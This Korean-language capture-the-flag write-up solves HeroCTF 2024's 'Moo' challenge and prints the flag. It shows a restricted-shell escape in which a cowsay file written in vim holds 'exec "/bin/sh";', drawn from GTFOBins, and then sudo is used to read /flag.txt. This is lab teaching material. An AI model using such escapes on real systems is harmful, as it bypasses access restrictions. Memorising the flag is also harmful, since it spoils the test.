## CTF 정보
- CTF: HeroCTF 2024
- 문제 이름: Moo
- 점수: 50
- 난이도: easy

## Description
Just read the flag, it's all there.

Credentials: user:password

> Deploy on deploy.heroctf.fr

- Format : Hero{flag}
- Author : Log_s

## Solution
```bash
 ______________________________________________________
/ Welcome dear CTF player! You can read the flag with: \
\ /bin/sudo /bin/cat /flag.txt                         /
 ------------------------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

문제에 접속해보면 기존에 쉘에서 입력할 수 있는 명령어를 입력할 수가 없다. `PATH`를 확인해보면 `/usr/local/rbin`이 있는데, 이 경로에 있는 명령어를 확인해보면 사용할 수 있는 명령어가 제한적임을 알 수 있다.

```bash
user@moo:~$ echo $PATH
/usr/local/rbin
user@moo:~$ ls /usr/local/rbin
cowsay  dircolors  ls  rbash  vim
```

HeroCTF에서 다른 문제 롸업을 보는데 cowsay 명령어를 사용해서 플래그를 읽어오는 문제가 있었다. 
이 사이트에 쉘 명령어를 이용해서 권한을 우회하는 방법들이 있었다. 앞으로 참고하기 좋은 사이트인 것 같다.
> GTFOBins: https://gtfobins.github.io/gtfobins/cowsay/

```bash
TF=$(mktemp)
echo 'exec "/bin/sh";' >$TF
cowsay -f $TF x
```
이렇게 넣어보면 된다고 하는데 `mktemp` 명령어를 사용할 수 없어서 다른 방법이 필요하다.

```bash
$ echo 'exec "/bin/sh";' >file
bash: file: restricted: cannot redirect output
```

## Exploit Algorithm
```bash
user@moo:~$ vim a
exec "/bin/sh";
```

```bash
user@moo:~$ cowsay -f ./a x 
$ /bin/sudo /bin/cat /flag.txt
Hero{s0m3_s4cr3d_c0w}
```

vim과 cowsay 명령어를 사용할 수 있으므로 vim 명령어를 통해 쉘을 실행하는 문구를 넣고, 해당 파일을 cowsay 명령어를 통해 출력하도록 한다.


## Flag
`Hero{s0m3_s4cr3d_c0w}`